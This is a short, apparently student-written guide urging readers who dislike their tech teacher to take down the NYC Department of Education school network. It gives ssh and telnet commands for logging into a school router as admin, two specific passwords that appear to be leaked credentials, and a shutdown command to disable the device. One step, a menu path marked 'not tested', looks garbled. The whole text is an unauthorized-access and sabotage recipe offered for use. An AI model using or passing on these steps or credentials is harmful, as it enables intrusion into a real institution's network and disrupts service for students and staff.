do you hate your tech teacher?
do you want to send the entire state into frenzy?
just three easy steps to absolutely ANNIHILATE the NYCDOE's "robust network system"!

when your teacher isnt looking:

1. get into router (ssh/telnet -- if ssh doesnt work, then try telnet. if none work, back to drawing board)

ssh admin@<routerip>
OR
use System Preferences > Network > ncpsp > Advanced > Port Scan > Enter in ip address of router and get port! (not tested)
telnet <routerip> <port>

when it asks you for a password, do NOT PUT IN SDE4t3am, instead put in 122D304001@RACKID30Q122. If the latter doesnt work, try SDE4t3am again. If none work, back to the drawing board.

2. sudo shutdown -h now!!!

3. profit
